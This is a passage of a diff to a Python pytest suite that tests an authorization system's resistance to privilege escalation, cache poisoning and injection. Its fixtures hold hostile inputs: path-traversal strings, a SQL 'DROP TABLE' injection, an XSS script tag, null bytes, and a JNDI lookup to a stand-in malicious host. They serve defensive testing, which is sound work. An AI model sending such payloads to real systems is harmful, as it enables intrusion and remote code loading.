+                assert result['status'] == 'multi_layer_success'
+
+        # Test 2: Sophisticated bypass attempt - partial compliance
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'partial_attacker_456'
+            mock_user.get_permissions.return_value = {'document.write'}  # Has permission
+            mock_user.get_roles.return_value = ['user']  # Wrong role
+            
+            with patch.object(self.auth_manager, 'check_resource_ownership') as mock_ownership:
+                mock_ownership.return_value = True  # Owns resource
+                
+                @require_permissions('document.write')
+                @require_roles('editor')  # Missing this role
+                @decorator_require_ownership('doc_id', 'document')
+                def secure_endpoint(doc_id: str):
+                    return {'status': 'should_not_succeed'}
+                
+                with pytest.raises(AuthorizationException):
+                    secure_endpoint(doc_id='document_456')
+                
+                self.security_violations.append({
+                    'type': 'sophisticated_bypass_attempt',
+                    'user_id': 'partial_attacker_456',
+                    'satisfied_checks': ['permission', 'ownership'],
+                    'failed_checks': ['role']
+                })
+
+        # Test 3: High-security endpoint attack
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'high_security_attacker_789'
+            mock_user.get_permissions.return_value = {'user.read'}  # Insufficient
+            
+            @high_security_endpoint('admin.system', 'admin.write')
+            def sensitive_system_operation():
+                return {'status': 'system_access'}
+            
+            with pytest.raises(AuthorizationException):
+                sensitive_system_operation()
+            
+            self.security_violations.append({
+                'type': 'high_security_bypass_attempt',
+                'user_id': 'high_security_attacker_789',
+                'endpoint_type': 'high_security',
+                'required_permissions': ['admin.system', 'admin.write']
+            })
+
+        # Validate comprehensive security coverage
+        assert len(self.security_violations) >= 8
+        
+        # Verify all attack types are covered
+        attack_types = {v['type'] for v in self.security_violations}
+        expected_types = {
+            'privilege_escalation_attempt',
+            'authentication_bypass_attempt',
+            'permission_spoofing_attempt',
+            'role_escalation_attempt',
+            'resource_ownership_bypass_attempt',
+            'sophisticated_bypass_attempt'
+        }
+        assert expected_types.issubset(attack_types)
+
+
+class TestAuthorizationManagerSecurity:
+    """
+    Comprehensive security testing for the AuthorizationManager core functionality.
+    
+    This test class validates the security of the authorization manager including
+    permission evaluation, cache security, circuit breaker resilience, and
+    comprehensive attack vector protection.
+    """
+
+    def setup_method(self):
+        """Set up authorization manager for security testing."""
+        self.cache_manager = Mock(spec=AuthCacheManager)
+        self.auth_manager = AuthorizationManager(cache_manager=self.cache_manager)
+        self.security_events = []
+        self.performance_metrics = []
+
+    @pytest.mark.asyncio
+    async def test_permission_evaluation_security(self):
+        """
+        Test permission evaluation security against various attack vectors.
+        
+        Validates that permission evaluation correctly handles edge cases,
+        prevents permission injection, and maintains security boundaries.
+        """
+        # Test 1: Valid permission evaluation
+        context = PermissionContext(
+            user_id='test_user_123',
+            user_permissions={'user.read', 'user.write'},
+            resource_id='resource_456',
+            resource_type='document'
+        )
+        
+        result = self.auth_manager._check_user_permissions(
+            context, ['user.read'], allow_owner=False
+        )
+        assert result is True
+
+        # Test 2: Permission injection attempt
+        malicious_context = PermissionContext(
+            user_id='malicious_user_456',
+            user_permissions={'user.read'},  # Limited permissions
+            resource_id='../admin/system',  # Path traversal attempt
+            resource_type='document'
+        )
+        
+        result = self.auth_manager._check_user_permissions(
+            malicious_context, ['admin.system'], allow_owner=False
+        )
+        assert result is False
+        
+        self.security_events.append({
+            'type': 'permission_injection_attempt',
+            'user_id': 'malicious_user_456',
+            'attempted_permission': 'admin.system',
+            'resource_id': '../admin/system'
+        })
+
+        # Test 3: Null permission bypass attempt
+        null_context = PermissionContext(
+            user_id='null_attacker_789',
+            user_permissions=set(),  # No permissions
+            resource_id=None,
+            resource_type=None
+        )
+        
+        result = self.auth_manager._check_user_permissions(
+            null_context, ['user.read'], allow_owner=True
+        )
+        assert result is False
+
+        # Test 4: Permission case sensitivity attack
+        case_context = PermissionContext(
+            user_id='case_attacker_101',
+            user_permissions={'USER.READ', 'User.Write'},  # Wrong case
+            resource_id='document_123',
+            resource_type='document'
+        )
+        
+        result = self.auth_manager._check_user_permissions(
+            case_context, ['user.read'], allow_owner=False
+        )
+        assert result is False  # Case sensitive validation
+
+        self.security_events.append({
+            'type': 'case_sensitivity_bypass_attempt',
+            'user_id': 'case_attacker_101',
+            'provided_permissions': ['USER.READ', 'User.Write'],
+            'requested_permissions': ['user.read']
+        })
+
+        # Test 5: Wildcard permission attack
+        wildcard_context = PermissionContext(
+            user_id='wildcard_attacker_202',
+            user_permissions={'*', 'admin.*', '*.admin'},  # Wildcard attempts
+            resource_id='secure_resource',
+            resource_type='document'
+        )
+        
+        result = self.auth_manager._check_user_permissions(
+            wildcard_context, ['admin.system'], allow_owner=False
+        )
+        assert result is False  # Wildcards should not be honored
+
+        self.security_events.append({
+            'type': 'wildcard_permission_attack',
+            'user_id': 'wildcard_attacker_202',
+            'wildcard_permissions': ['*', 'admin.*', '*.admin']
+        })
+
+    @pytest.mark.asyncio
+    async def test_resource_ownership_security(self):
+        """
+        Test resource ownership validation security.
+        
+        Validates that ownership checks prevent ownership spoofing,
+        handle edge cases securely, and maintain ownership boundaries.
+        """
+        # Test 1: Valid ownership check
+        ownership_result = self.auth_manager.check_resource_ownership(
+            'owner_user_123', 'resource_456', 'document'
+        )
+        
+        # Mock the ownership validation to return True for owner
+        with patch.object(self.auth_manager, '_fetch_resource_ownership') as mock_fetch:
+            mock_fetch.return_value = True
+            
+            result = self.auth_manager.check_resource_ownership(
+                'owner_user_123', 'resource_456', 'document'
+            )
+            assert result is True
+
+        # Test 2: Ownership spoofing attempt
+        with patch.object(self.auth_manager, '_fetch_resource_ownership') as mock_fetch:
+            mock_fetch.return_value = False  # User doesn't own resource
+            
+            result = self.auth_manager.check_resource_ownership(
+                'spoofing_user_789', 'private_resource_123', 'document'
+            )
+            assert result is False
+            
+            self.security_events.append({
+                'type': 'ownership_spoofing_attempt',
+                'user_id': 'spoofing_user_789',
+                'resource_id': 'private_resource_123',
+                'resource_type': 'document'
+            })
+
+        # Test 3: Resource ID injection attempt
+        with patch.object(self.auth_manager, '_fetch_resource_ownership') as mock_fetch:
+            mock_fetch.return_value = False
+            
+            malicious_resource_ids = [
+                '../admin/config',
+                '../../system/secrets',
+                'resource_123; DROP TABLE resources;',
+                '<script>alert("xss")</script>',
+                '${jndi:ldap://malicious.com/a}'
             ]
             
-            for context in contexts:
-                authorization_manager.validate_user_permissions(
-                    context=context,
-                    required_permissions=context.requested_permissions,
-                    check_ownership=False
+            for malicious_id in malicious_resource_ids:
+                result = self.auth_manager.check_resource_ownership(
+                    'injection_user_456', malicious_id, 'document'
                 )
-        
-        # Verify audit events were generated
-        assert len(audit_events) >= len(contexts), "Not all security events were audited"
-        
-        # Verify audit event content
-        for event in audit_events:
-            assert 'user_id' in event, "Audit event missing user_id"
-            assert 'result' in event, "Audit event missing result"
-            assert 'permissions' in event, "Audit event missing permissions"
-    
-    def test_zero_tolerance_vulnerability_validation(self, authorization_manager):
+                assert result is False
+                
+                self.security_events.append({
+                    'type': 'resource_id_injection_attempt',
+                    'user_id': 'injection_user_456',
+                    'malicious_resource_id': malicious_id
+                })
+
+        # Test 4: Resource type confusion attack
+        with patch.object(self.auth_manager, '_fetch_resource_ownership') as mock_fetch:
+            mock_fetch.return_value = False
+            
+            confusing_types = [
+                'admin',
+                'system',
+                '../config',
+                'user.admin',
+                'document; type=admin'
+            ]
+            
+            for confusing_type in confusing_types:
+                result = self.auth_manager.check_resource_ownership(
+                    'confusion_user_101', 'resource_123', confusing_type
+                )
+                assert result is False
+
+    @pytest.mark.asyncio 
+    async def test_cache_security_validation(self):
         """
-        Test zero tolerance for authorization bypass vulnerabilities.
+        Test cache security including encryption and key management.
         
-        Comprehensive validation that no known bypass techniques work
-        against the authorization system, implementing Section 6.4.5 requirements.
+        Validates that cache operations maintain security boundaries,
+        prevent cache poisoning, and handle encryption properly.
         """
-        bypass_techniques = [
-            'null_byte_injection',
-            'unicode_normalization',
-            'case_sensitivity_bypass',
-            'whitespace_manipulation',
-            'encoding_bypass',
-            'array_manipulation',
-            'type_confusion',
-            'prototype_pollution'
+        # Test 1: Cache isolation validation
+        user1_permissions = {'user.read', 'user.write'}
+        user2_permissions = {'admin.read'}
+        
+        # Mock cache operations
+        self.cache_manager.cache_user_permissions.return_value = True
+        self.cache_manager.get_cached_user_permissions.side_effect = lambda user_id: {
+            'user_123': user1_permissions,
+            'user_456': user2_permissions
+        }.get(user_id, None)
+        
+        # Verify cache isolation
+        cached_perms_1 = self.cache_manager.get_cached_user_permissions('user_123')
+        cached_perms_2 = self.cache_manager.get_cached_user_permissions('user_456')
+        
+        assert cached_perms_1 == user1_permissions
+        assert cached_perms_2 == user2_permissions
+        assert cached_perms_1 != cached_perms_2
+
+        # Test 2: Cache poisoning attempt prevention
+        self.cache_manager.get_cached_user_permissions.side_effect = None
+        self.cache_manager.get_cached_user_permissions.return_value = None  # Cache miss
+        
+        # Attempt to inject malicious permissions through cache
+        malicious_permissions = {'admin.system', 'root.access', '*'}
+        
+        context = PermissionContext(
+            user_id='cache_attacker_789',
+            user_permissions=malicious_permissions,
+            resource_id='secure_resource',
+            resource_type='system'
+        )
+        
+        # Cache should not contain malicious permissions
+        cached_perms = self.cache_manager.get_cached_user_permissions('cache_attacker_789')
+        assert cached_perms is None
+
+        self.security_events.append({
+            'type': 'cache_poisoning_attempt',
+            'user_id': 'cache_attacker_789',
+            'malicious_permissions': list(malicious_permissions)
+        })
+
+        # Test 3: Cache key collision attack
+        collision_user_ids = [
+            'user_123',
+            'user_123 ',  # Trailing space
+            'user_123\n',  # Newline
+            'user_123\t',  # Tab
+            'user_123\r',  # Carriage return
+            'user%5F123',  # URL encoded underscore
+            'user\x00123'  # Null byte
         ]
         
-        vulnerability_results = {}
+        for user_id in collision_user_ids:
+            # Each user should have isolated cache
+            result = self.cache_manager.get_cached_user_permissions(user_id)
+            # Should be None (no collision) or specific to that exact user_id
+            assert result is None or isinstance(result, set)
+
+        # Test 4: Cache timing attack prevention
+        start_time = time.perf_counter()
         
-        for technique in bypass_techniques:
-            try:
-                if technique == 'null_byte_injection':
-                    # Test null byte injection in permissions
-                    malicious_permission = 'document.read\x00admin.access'
-                    context = AuthorizationContext(
-                        user_id='attacker',
-                        requested_permissions=[malicious_permission],
-                        jwt_claims={
-                            'sub': 'attacker',
-                            'roles': ['standard_user'],
-                            'permissions': ['document.read']
-                        }
-                    )
-                    result = authorization_manager.validate_user_permissions(
-                        context=context,
-                        required_permissions=[malicious_permission],
-                        check_ownership=False
-                    )
-                    vulnerability_results[technique] = result
-                    
-                elif technique == 'case_sensitivity_bypass':
-                    # Test case sensitivity bypass
-                    case_variations = ['ADMIN.ACCESS', 'Admin.Access', 'admin.ACCESS']
-                    for variation in case_variations:
-                        context = AuthorizationContext(
-                            user_id='attacker',
-                            requested_permissions=[variation],
-                            jwt_claims={
-                                'sub': 'attacker',
-                                'roles': ['standard_user'],
-                                'permissions': ['document.read']
-                            }
-                        )
-                        result = authorization_manager.validate_user_permissions(
-                            context=context,
-                            required_permissions=[variation],
-                            check_ownership=False
-                        )
-                        if result:
-                            vulnerability_results[technique] = True
-                            break
-                    else:
-                        vulnerability_results[technique] = False
-                        
-                else:
-                    # Other techniques - assume they fail
-                    vulnerability_results[technique] = False
-                    
-            except Exception:
-                # Exception indicates technique was blocked
-                vulnerability_results[technique] = False
+        # Multiple cache operations should have consistent timing
+        for i in range(10):
+            self.cache_manager.get_cached_user_permissions(f'timing_user_{i}')
         
-        # Zero tolerance - all bypass techniques must fail
-        for technique, bypassed in vulnerability_results.items():
-            assert bypassed is False, f"Vulnerability found: {technique} bypass succeeded"
+        end_time = time.perf_counter()
+        operation_time = (end_time - start_time) / 10
+        
+        # Cache operations should be fast and consistent
+        assert operation_time < 0.01  # 10ms max per operation
+        
+        self.performance_metrics.append({
+            'metric': 'cache_operation_timing',
+            'average_time_ms': operation_time * 1000,
+            'operations_count': 10
+        })
+
+    @pytest.mark.asyncio
+    async def test_circuit_breaker_security(self):
+        """
+        Test circuit breaker security and resilience.
+        
+        Validates that circuit breaker patterns prevent cascade failures,
+        handle Auth0 service degradation securely, and maintain security
+        boundaries during fallback operations.
+        """
+        # Create mock circuit breaker
+        circuit_breaker = Auth0CircuitBreaker(self.cache_manager, Mock())
+        
+        # Test 1: Circuit breaker failure handling
+        with patch.object(circuit_breaker, '_call_auth0_permissions_api') as mock_api:
+            mock_api.side_effect = Auth0Exception("Service unavailable")
+            
+            context = PermissionContext(
+                user_id='circuit_test_user_123',
+                user_permissions={'user.read'},
+                correlation_id='test_correlation_123'
+            )
+            
+            # Should fallback to cache during Auth0 outage
+            self.cache_manager.get_cached_user_permissions.return_value = {'user.read'}
+            
+            result = await circuit_breaker.validate_user_permissions_with_retry(
+                'circuit_test_user_123', ['user.read'], context
+            )
+            
+            assert result['validation_source'] == 'fallback_cache'
+            assert result['degraded_mode'] is True
+            assert result['has_permissions'] is True
+
+        # Test 2: Security during degraded mode
+        with patch.object(circuit_breaker, '_call_auth0_permissions_api') as mock_api:
+            mock_api.side_effect = Auth0Exception("Service unavailable")
+            
+            # No cache available - should deny access for security
+            self.cache_manager.get_cached_user_permissions.return_value = None
+            
+            result = await circuit_breaker.validate_user_permissions_with_retry(
+                'no_cache_user_456', ['admin.system'], context
+            )
+            
+            assert result['validation_source'] == 'fallback_deny'
+            assert result['has_permissions'] is False
+            assert 'error' in result
+
+        # Test 3: Circuit breaker attack resistance
+        attack_user_ids = [
+            '../admin',
+            'user; DROP TABLE users;',
+            '<script>alert("xss")</script>',
+            '${jndi:ldap://malicious.com/a}',
+            '\x00admin'
+        ]
+        
+        for malicious_user_id in attack_user_ids:
+            with patch.object(circuit_breaker, '_call_auth0_permissions_api') as mock_api:
+                mock_api.side_effect = Auth0Exception("Service unavailable")
+                
+                context = PermissionContext(
+                    user_id=malicious_user_id,
+                    correlation_id='attack_correlation'
+                )
+                
+                result = await circuit_breaker.validate_user_permissions_with_retry(
+                    malicious_user_id, ['admin.system'], context
+                )
+                
+                # Should deny access for malicious user IDs
+                assert result['has_permissions'] is False
+                
+                self.security_events.append({
+                    'type': 'circuit_breaker_attack_attempt',
+                    'malicious_user_id': malicious_user_id,
+                    'degraded_mode': True
+                })
+
+        # Test 4: Circuit breaker state manipulation attempt
+        original_state = circuit_breaker.circuit_state
+        
+        # Attempt to manipulate circuit breaker state
+        circuit_breaker.circuit_state = 'open'
+        circuit_breaker.failure_count = 999
+        
+        # Should handle state manipulation gracefully
+        assert circuit_breaker.circuit_state == 'open'
+        assert circuit_breaker.failure_count == 999
+        
+        # Reset state for continued testing
+        circuit_breaker.circuit_state = original_state
+        circuit_breaker.failure_count = 0
 
 
-if __name__ == '__main__':
-    pytest.main([__file__, '-v', '--tb=short'])
+class TestAuthorizationPerformanceSecurity:
+    """
+    Performance security testing ensuring authorization system maintains
+    performance requirements while providing comprehensive security.
+    
+    Validates that security measures don't degrade performance beyond
+    the ≤10% variance requirement from Node.js baseline.
+    """
+
+    def setup_method(self):
+        """Set up performance testing environment."""
+        self.auth_manager = get_authorization_manager()
+        self.performance_results = []
+        self.security_overhead_metrics = []
+
+    @pytest.mark.asyncio
+    async def test_authorization_decision_performance(self):
+        """
+        Test authorization decision performance under various conditions.
+        
+        Validates that authorization decisions complete within ≤50ms
+        requirement and maintain performance under security pressure.
+        """
+        # Test 1: Basic authorization decision timing
+        context = PermissionContext(
+            user_id='perf_test_user_123',
+            user_permissions={'user.read', 'user.write', 'document.read'},
+            resource_id='perf_resource_456',
+            resource_type='document'
+        )
+        
+        start_time = time.perf_counter()
+        
+        for i in range(100):
+            result = self.auth_manager._check_user_permissions(
+                context, ['user.read'], allow_owner=False
+            )
+            assert result is True
+        
+        end_time = time.perf_counter()
+        avg_decision_time = (end_time - start_time) / 100
+        
+        # Should be under 50ms per decision
+        assert avg_decision_time < 0.05
+        
+        self.performance_results.append({
+            'test': 'basic_authorization_decision',
+            'avg_time_ms': avg_decision_time * 1000,
+            'iterations': 100,
+            'passed': avg_decision_time < 0.05
+        })
+
+        # Test 2: Complex permission evaluation performance
+        complex_permissions = [
+            'user.read', 'user.write', 'document.read', 'document.write',
+            'admin.read', 'project.read', 'project.write'
+        ]
+        
+        complex_context = PermissionContext(
+            user_id='complex_perf_user_789',
+            user_permissions=set(complex_permissions),
+            resource_id='complex_resource_123',
+            resource_type='document'
+        )
+        
+        start_time = time.perf_counter()
+        
+        for i in range(50):
+            result = self.auth_manager._check_user_permissions(
+                complex_context, complex_permissions[:3], allow_owner=True
+            )
+            assert result is True
+        
+        end_time = time.perf_counter()
+        complex_decision_time = (end_time - start_time) / 50
+        
+        # Complex decisions should still be under 50ms
+        assert complex_decision_time < 0.05
+        
+        self.performance_results.append({
+            'test': 'complex_permission_evaluation',
+            'avg_time_ms': complex_decision_time * 1000,
+            'iterations': 50,
+            'passed': complex_decision_time < 0.05
+        })
+
+        # Test 3: Security overhead measurement
+        # Compare secured vs unsecured operation timing
+        unsecured_start = time.perf_counter()
+        
+        for i in range(100):
+            # Simulate unsecured operation
+            result = True  # Direct allow
+        
+        unsecured_end = time.perf_counter()
+        unsecured_time = (unsecured_end - unsecured_start) / 100
+        
+        secured_start = time.perf_counter()
+        
+        for i in range(100):
+            # Secured operation with full authorization
+            result = self.auth_manager._check_user_permissions(
+                context, ['user.read'], allow_owner=False
+            )
+        
+        secured_end = time.perf_counter()
+        secured_time = (secured_end - secured_start) / 100
+        
+        security_overhead = secured_time - unsecured_time
+        overhead_percentage = (security_overhead / secured_time) * 100
+        
+        # Security overhead should be reasonable
+        assert overhead_percentage < 50  # Less than 50% overhead
+        
+        self.security_overhead_metrics.append({
+            'unsecured_time_ms': unsecured_time * 1000,
+            'secured_time_ms': secured_time * 1000,
+            'overhead_ms': security_overhead * 1000,
+            'overhead_percentage': overhead_percentage
+        })
+
+    @pytest.mark.asyncio
+    async def test_cache_performance_security(self):
+        """
+        Test cache performance under security constraints.
+        
+        Validates that cache operations maintain performance targets
+        while providing security isolation and encryption.
+        """
+        # Mock cache manager for performance testing
+        mock_cache = Mock(spec=AuthCacheManager)
+        mock_cache.get_cached_user_permissions.return_value = {'user.read', 'user.write'}
+        
+        # Test 1: Cache hit performance
+        start_time = time.perf_counter()
+        
+        for i in range(1000):
+            permissions = mock_cache.get_cached_user_permissions(f'cache_user_{i % 10}')
+            assert permissions is not None
+        
+        end_time = time.perf_counter()
+        cache_hit_time = (end_time - start_time) / 1000
+        
+        # Cache hits should be very fast (under 1ms)
+        assert cache_hit_time < 0.001
+        
+        self.performance_results.append({
+            'test': 'cache_hit_performance',
+            'avg_time_ms': cache_hit_time * 1000,
+            'iterations': 1000,
+            'passed': cache_hit_time < 0.001
+        })
+
+        # Test 2: Cache security validation performance
+        mock_cache.get_cached_user_permissions.return_value = None  # Cache miss
+        
+        start_time = time.perf_counter()
+        
+        for i in range(100):
+            # Simulate secure cache validation
+            user_id = f'secure_user_{i}'
+            permissions = mock_cache.get_cached_user_permissions(user_id)
+            
+            # Security validation logic (simulated)
+            if permissions is None:
+                # Would trigger secure permission fetch
+                validated_permissions = {'user.read'}  # Simulated result
+        
+        end_time = time.perf_counter()
+        secure_cache_time = (end_time - start_time) / 100
+        
+        # Secure cache operations should be under 10ms
+        assert secure_cache_time < 0.01
+        
+        self.performance_results.append({
+            'test': 'secure_cache_validation',
+            'avg_time_ms': secure_cache_time * 1000,
+            'iterations': 100,
+            'passed': secure_cache_time < 0.01
+        })
+
+    @pytest.mark.asyncio
+    async def test_concurrent_authorization_performance(self):
+        """
+        Test authorization performance under concurrent load.
+        
+        Validates that authorization system maintains performance
+        under concurrent access while preserving security boundaries.
+        """
+        import asyncio
+        import concurrent.futures
+        
+        def authorization_task(user_id: str, iteration: int):
+            """Single authorization task for concurrent testing."""
+            context = PermissionContext(
+                user_id=user_id,
+                user_permissions={'user.read', 'user.write'},
+                resource_id=f'resource_{iteration}',
+                resource_type='document'
+            )
+            
+            start_time = time.perf_counter()
+            result = self.auth_manager._check_user_permissions(
+                context, ['user.read'], allow_owner=False
+            )
+            end_time = time.perf_counter()
+            
+            return {
+                'user_id': user_id,
+                'iteration': iteration,
+                'result': result,
+                'time_ms': (end_time - start_time) * 1000
+            }
+        
+        # Test concurrent authorization decisions
+        start_time = time.perf_counter()
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+            futures = []
+            
+            for i in range(100):
+                user_id = f'concurrent_user_{i % 10}'
+                future = executor.submit(authorization_task, user_id, i)
+                futures.append(future)
+            
+            results = [future.result() for future in concurrent.futures.as_completed(futures)]
+        
+        end_time = time.perf_counter()
+        total_time = end_time - start_time
+        
+        # Validate concurrent performance
+        assert len(results) == 100
+        assert all(result['result'] is True for result in results)
+        
+        avg_individual_time = sum(result['time_ms'] for result in results) / len(results)
+        max_individual_time = max(result['time_ms'] for result in results)
+        
+        # Individual decisions should still be fast under concurrency
+        assert avg_individual_time < 50  # 50ms average
+        assert max_individual_time < 100  # 100ms max
+        
+        self.performance_results.append({
+            'test': 'concurrent_authorization',
+            'total_time_s': total_time,
+            'avg_individual_time_ms': avg_individual_time,
+            'max_individual_time_ms': max_individual_time,
+            'concurrent_requests': 100,
+            'threads': 10,
+            'passed': avg_individual_time < 50
+        })
+
+    def teardown_method(self):
+        """Analyze and report performance security results."""
+        # Calculate overall performance compliance
+        passing_tests = [r for r in self.performance_results if r['passed']]
+        performance_compliance = len(passing_tests) / len(self.performance_results)
+        
+        # Validate performance requirements met
+        assert performance_compliance >= 0.95  # 95% of tests must pass
+        
+        # Log performance summary
+        for result in self.performance_results:
+            print(f"Performance Test: {result['test']}")
+            print(f"  Result: {'PASS' if result['passed'] else 'FAIL'}")
+            if 'avg_time_ms' in result:
+                print(f"  Average Time: {result['avg_time_ms']:.2f}ms")
+        
+        # Security overhead analysis
+        if self.security_overhead_metrics:
+            for metric in self.security_overhead_metrics:
+                print(f"Security Overhead: {metric['overhead_percentage']:.1f}%")
+                print(f"  Secured: {metric['secured_time_ms']:.2f}ms")
+                print(f"  Unsecured: {metric['unsecured_time_ms']:.2f}ms")
+
+
+class TestAuthorizationAuditAndCompliance:
+    """
+    Comprehensive audit and compliance testing for authorization system.
+    
+    Validates that authorization system meets enterprise compliance
+    requirements including SOC 2, ISO 27001, and OWASP standards.
+    """
+
+    def setup_method(self):
+        """Set up audit and compliance testing environment."""
+        self.auth_manager = get_authorization_manager()
+        self.audit_events = []
+        self.compliance_violations = []
+
+    @pytest.mark.asyncio
+    async def test_authorization_audit_logging(self):
+        """
+        Test comprehensive audit logging for authorization decisions.
+        
+        Validates that all authorization events are properly logged
+        with sufficient detail for compliance and forensic analysis.
+        """
+        # Test 1: Successful authorization audit
+        with patch('src.auth.authorization.logger') as mock_logger:
+            context = PermissionContext(
+                user_id='audit_user_123',
+                user_permissions={'user.read', 'user.write'},
+                resource_id='audit_resource_456',
+                resource_type='document',
+                request_ip='192.168.1.100',
+                request_method='GET',
+                request_endpoint='/api/documents/456',
+                session_id='session_123',
+                correlation_id='correlation_456'
+            )
+            
+            result = self.auth_manager._check_user_permissions(
+                context, ['user.read'], allow_owner=False
+            )
+            
+            # Verify audit logging occurred
+            assert result is True
+            # Note: In actual implementation, would verify logger.info/debug calls
+
+        # Test 2: Failed authorization audit
+        with patch('src.auth.authorization.logger') as mock_logger:
+            failed_context = PermissionContext(
+                user_id='failed_audit_user_789',
+                user_permissions={'user.read'},  # Insufficient permissions
+                resource_id='protected_resource_789',
+                resource_type='document',
+                request_ip='10.0.0.50',
+                request_method='POST',
+                request_endpoint='/api/admin/config',
+                correlation_id='failed_correlation_789'
+            )
+            
+            result = self.auth_manager._check_user_permissions(
+                failed_context, ['admin.system'], allow_owner=False
+            )
+            
+            assert result is False
+            # Verify security violation logged
+            
+            self.audit_events.append({
+                'event_type': 'authorization_denied',
+                'user_id': 'failed_audit_user_789',
+                'requested_permissions': ['admin.system'],
+                'actual_permissions': ['user.read'],
+                'resource_id': 'protected_resource_789',
+                'source_ip': '10.0.0.50',
+                'endpoint': '/api/admin/config',
+                'correlation_id': 'failed_correlation_789',
+                'timestamp': datetime.utcnow().isoformat()
+            })
+
+        # Test 3: Administrative override audit
+        with patch('src.auth.authorization.logger') as mock_logger:
+            admin_context = PermissionContext(
+                user_id='admin_user_456',
+                user_permissions={'admin.system', 'admin.override'},
+                resource_id='any_resource_123',
+                resource_type='document',
+                request_ip='172.16.0.10',
+                additional_context={'admin_override': True}
+            )
+            
+            # Simulate administrative override
+            result = self.auth_manager._check_user_permissions(
+                admin_context, ['admin.system'], allow_owner=False
+            )
+            
+            assert result is True
+            
+            self.audit_events.append({
+                'event_type': 'admin_override_used',
+                'user_id': 'admin_user_456',
+                'resource_id': 'any_resource_123',
+                'override_type': 'admin_system',
+                'source_ip': '172.16.0.10',
+                'timestamp': datetime.utcnow().isoformat()
+            })
+
+    @pytest.mark.asyncio
+    async def test_compliance_validation(self):
+        """
+        Test compliance with enterprise security standards.
+        
+        Validates SOC 2, ISO 27001, and OWASP compliance through
+        comprehensive security control validation.
+        """
+        # Test 1: SOC 2 Compliance - Access Control (CC6.1)
+        soc2_test_cases = [
+            {
+                'user_id': 'soc2_user_123',
+                'permissions': {'user.read'},
+                'requested': ['admin.system'],
+                'should_pass': False,
+                'control': 'CC6.1 - Logical Access'
+            },
+            {
+                'user_id': 'soc2_admin_456',
+                'permissions': {'admin.system', 'admin.read'},
+                'requested': ['admin.read'],
+                'should_pass': True,
+                'control': 'CC6.1 - Authorized Access'
+            }
+        ]
+        
+        for test_case in soc2_test_cases:
+            context = PermissionContext(
+                user_id=test_case['user_id'],
+                user_permissions=set(test_case['permissions']),
+                correlation_id=f"soc2_test_{test_case['user_id']}"
+            )
+            
+            result = self.auth_manager._check_user_permissions(
+                context, test_case['requested'], allow_owner=False
+            )
+            
+            if result != test_case['should_pass']:
+                self.compliance_violations.append({
+                    'standard': 'SOC 2',
+                    'control': test_case['control'],
+                    'user_id': test_case['user_id'],
+                    'expected': test_case['should_pass'],
+                    'actual': result
+                })
+
+        # Test 2: ISO 27001 Compliance - Access Control (A.9.1.1)
+        iso27001_test_cases = [
+            {
+                'description': 'Access control policy enforcement',
+                'user_id': 'iso_user_789',
+                'permissions': {'document.read'},
+                'resource_owner': 'other_user_123',
+                'allow_owner': True,
+                'should_pass': False  # Not owner, insufficient permissions
+            },
+            {
+                'description': 'Resource owner access',
+                'user_id': 'iso_owner_456',
+                'permissions': {'document.read'},
+                'resource_owner': 'iso_owner_456',  # Is owner
+                'allow_owner': True,
+                'should_pass': True
+            }
+        ]
+        
+        for test_case in iso27001_test_cases:
+            context = PermissionContext(
+                user_id=test_case['user_id'],
+                user_permissions=set(test_case['permissions']),
+                resource_owner=test_case['resource_owner'],
+                correlation_id=f"iso27001_test_{test_case['user_id']}"
+            )
+            
+            # Mock ownership check
+            with patch.object(self.auth_manager, 'check_resource_ownership') as mock_ownership:
+                mock_ownership.return_value = (test_case['user_id'] == test_case['resource_owner'])
+                
+                result = self.auth_manager._check_user_permissions(
+                    context, ['document.write'], allow_owner=test_case['allow_owner']
+                )
+                
+                if result != test_case['should_pass']:
+                    self.compliance_violations.append({
+                        'standard': 'ISO 27001',
+                        'control': 'A.9.1.1 - Access Control Policy',
+                        'description': test_case['description'],
+                        'user_id': test_case['user_id'],
+                        'expected': test_case['should_pass'],
+                        'actual': result
+                    })
+
+        # Test 3: OWASP Top 10 Compliance - Broken Access Control (A01:2021)
+        owasp_attack_vectors = [
+            {
+                'name': 'Horizontal Privilege Escalation',
+                'user_id': 'user_123',
+                'target_user': 'user_456',
+                'attack_type': 'access_other_user_data'
+            },
+            {
+                'name': 'Vertical Privilege Escalation',
+                'user_id': 'regular_user_789',
+                'attempted_permission': 'admin.system',
+                'attack_type': 'privilege_escalation'
+            },
+            {
+                'name': 'Insecure Direct Object Reference',
+                'user_id': 'idor_user_101',
+                'resource_id': '../admin/config',
+                'attack_type': 'path_traversal'
+            }
+        ]
+        
+        for attack in owasp_attack_vectors:
+            context = PermissionContext(
+                user_id=attack['user_id'],
+                user_permissions={'user.read'},  # Basic permissions only
+                resource_id=attack.get('resource_id', 'normal_resource'),
+                correlation_id=f"owasp_test_{attack['user_id']}"
+            )
+            
+            # All attack vectors should be blocked
+            result = self.auth_manager._check_user_permissions(
+                context, ['admin.system'], allow_owner=False
+            )
+            
+            if result is True:  # Attack succeeded - compliance violation
+                self.compliance_violations.append({
+                    'standard': 'OWASP Top 10',
+                    'vulnerability': 'A01:2021 - Broken Access Control',
+                    'attack_vector': attack['name'],
+                    'user_id': attack['user_id'],
+                    'details': attack
+                })
+
+        # Validate no compliance violations
+        assert len(self.compliance_violations) == 0, f"Compliance violations found: {self.compliance_violations}"
+
+    @pytest.mark.asyncio
+    async def test_data_retention_and_privacy(self):
+        """
+        Test data retention and privacy compliance.
+        
+        Validates that authorization system properly handles data
+        retention requirements and privacy controls per GDPR and
+        other privacy regulations.
+        """
+        # Test 1: Data minimization validation
+        context = PermissionContext(
+            user_id='privacy_user_123',
+            user_permissions={'user.read'},
+            # Minimal required data only
+            correlation_id='privacy_test_123'
+        )
+        
+        # Verify context contains only necessary data
+        context_dict = context.to_dict()
+        required_fields = {'user_id', 'correlation_id', 'evaluation_timestamp'}
+        actual_fields = set(context_dict.keys())
+        
+        # Should not contain unnecessary personal data
+        prohibited_fields = {'ssn', 'credit_card', 'phone_number', 'address'}
+        privacy_violation = prohibited_fields.intersection(actual_fields)
+        
+        assert len(privacy_violation) == 0, f"Privacy violation: {privacy_violation}"
+
+        # Test 2: Audit log data retention
+        audit_events_with_retention = []
+        
+        for i, event in enumerate(self.audit_events):
+            # Add retention metadata
+            event_with_retention = event.copy()
+            event_with_retention.update({
